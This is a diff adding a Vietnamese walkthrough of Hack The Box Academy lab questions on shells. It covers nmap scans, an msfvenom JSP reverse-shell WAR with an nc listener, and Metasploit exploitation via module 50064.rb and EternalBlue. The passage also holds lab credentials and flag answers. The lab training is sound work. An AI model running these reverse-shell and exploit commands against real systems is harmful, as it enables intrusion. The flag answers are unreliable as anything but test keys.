@@ -342,3 +342,173 @@ Dựa theo gợi ý và ví dụ đã làm ở trên trong bài module này ta l
 
 > **Đáp án:** `ajax-loader.gif`
 
+---
+
+### Q20: What is the hostname of Host-1? (Format: all lower case)
+
+Ta kết nối RDP đế máy chủ:  
+`xfreerdp /v:<IP> /u:htb-student /p:'HTB_@cademy_stdnt!`
+
+![rdp](./images/pic40.jpg)
+
+Đăng nhập:  
+`username: htb-student`  
+`password: HTB_@cademy_stdnt!'
+
+![rdp](./images/pic41.jpg)
+
+Ta tiến hành kiểm tra xem IP của máy chủ:  
+
+![rdp](./images/pic42.jpg)
+
+host1 là ens224 với ip: 172.16.1.5
+
+![rdp](./images/pic43.jpg)
+
+Tiến hành quét sâu vào các dịch vụ đang chạy trên dải mạng, ta thấy có 3 IP:  
+`172.16.1.5` là host 1 hiện tại  
+`172.16.1.11` là host 2  
+`172.16.1.12` là host 3
+
+![nmap](./images/pic44.jpg)
+
+Quét nmap host 1 để lấy đáp án
+
+> **Đáp án:** `shells-winsvr`
+
+---
+
+### Q21: Exploit the target and gain a shell session. Submit the name of the folder located in C:\Shares\ (Format: all lower case)
+
+Ở kết quả nmap ở trên ta thấy host 1 có mở cổng 80 là giao thức http, ta truy cập vào web thông qua port 80
+
+![nmap](./images/pic45.jpg)
+
+Vào mục `Host Manager`
+
+![nmap](./images/pic46.jpg)
+
+Ta sẽ tiến hành upload file chứa mã độc vào đây rồi chiếm quyền điều khiển
+
+![nmap](./images/pic47.jpg)
+
+mình sẽ dùng sẵn bộ công cụ mã độc java trong msfvenom  
+`msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.1.5 LPORT=443 -f war > shell.war`  
+Đồng thời, ở terminal khác mình sẽ mở sẵn cổng lắng nghe ở cổng 443: `sudo nc -lvnp 443`
+
+![nc](./images/pic48.jpg)
+
+Sau khi upload file lên và chạy file trên web, ta nhìn ở terminal đang mở cổng lắng nghe 443 đã bắt được thành công
+
+![answer](./images/pic49.jpg)
+
+Chạy lệnh `dir` để lấy đáp án
+
+> **Đáp án:** `dev-share`
+
+---
+
+### Q22: What distribution of Linux is running on Host-2? (Format: distro name, all lower case)
+
+Tiến hành nmap IP của cổng 2 là: `nmap -A 172.16.1.12`
+
+![answer](./images/pic50.jpg)
+
+Như ta thấy Host 2 chạy hệ điều hành Ubuntu
+
+> **Đáp án:** `Ubuntu`
+
+---
+
+### Q23: What language is the shell written in that gets uploaded when using the 50064.rb exploit?
+
+Ta tiến hành truy cập vào trang web `blog.inlanefreight.local` với IP `172.16.1.12` như ta đã tìm được ở trên  
+Tiến hành đăng nhập bằng tài khoản và mật khẩu ở màn hình Desktop có: `admin:admin123!@#`
+
+![answer](./images/pic51.jpg)
+
+Như ta có thể thấy 1 bài viết do chính người dùng này đăng lên về `50064.rb exploit` được viết bằng ngôn ngữ php
+
+> **Đáp án:** `PHP`
+
+---
+
+### Q24: Exploit the blog site and establish a shell session with the target OS. Submit the contents of /customscripts/flag.txt
+
+Ta sẽ dùng luôn mã độc `50064.rb` này để khai thác shell session  
+
+![copy](./images/pic52.jpg)
+
+Copy mã độc này sang 1 file khác để thực thi metasploit thuận tiện hơn
+
+![copy](./images/pic53.jpg)
+
+Mở metasploit lên rồi dùng file vừa copy
+
+![msf](./images/pic54.jpg)
+
+Ta sẽ tiến hành cài đặt trong options: 
+
+![msf](./images/pic55.jpg)
+![msf](./images/pic56.jpg)
+
+Chạy lần lượt các câu lệnh:  
+`set RHOSTS 172.16.1.12`  
+`set USERNAME admin`  
+`set PASSWORD admin123!@#`   
+`set VHOST blog.inlanefreight.local`  
+
+![msf](./images/pic57.jpg)
+
+Màn hình ra tab `meterpreter`
+
+![msf](./images/pic58.jpg)
+
+chạy lệnh `cat /customscripts/flag.txt` rồi lấy đáp án
+
+> **Đáp án:** `B1nD_Shells_r_cool`
+
+---
+
+### Q25: What is the hostname of Host-3?
+
+Thực hiện nmap quét IP của host 3:
+
+`nmap -A 172.16.1.13`
+
+![nmap](./images/pic59.jpg)
+
+như ta có thể thấy hostname là: SHELLS-WINBLUE
+
+> **Đáp án:** `SHELLS-WINBLUE`
+
+---
+
+### Q26: Exploit and gain a shell session with Host-3. Then submit the contents of C:\Users\Administrator\Desktop\Skills-flag.txt
+
+Ta tiến hành mở metasploit và tìm các module liên quan về `eternalblue`
+
+![search](./images/pic60.jpg)
+
+Ta sẽ dùng module 1  
+Lệnh: `use windows/smb/ms17_010_psexec` để dùng module 1
+
+![search](./images/pic61.jpg)
+
+Cấu hình trong options:  
+`set LHOST 172.16.1.5`  
+`set RHOSTS 172.16.1.13`
+
+![search](./images/pic62.jpg)
+
+Tiến hành quét trên metasploit
+
+![search](./images/pic63.jpg)
+
+Sau khi màn hình hiện ra tab: `meterpreter` ta chạy lệnh `search -f Skills-flag.txt` để tìm đáp án
+
+![answer](./images/pic64.jpg)
+
+Và ta đã tìm thấy đáp án
+
+> **Đáp án:** `One-H0st-Down!`
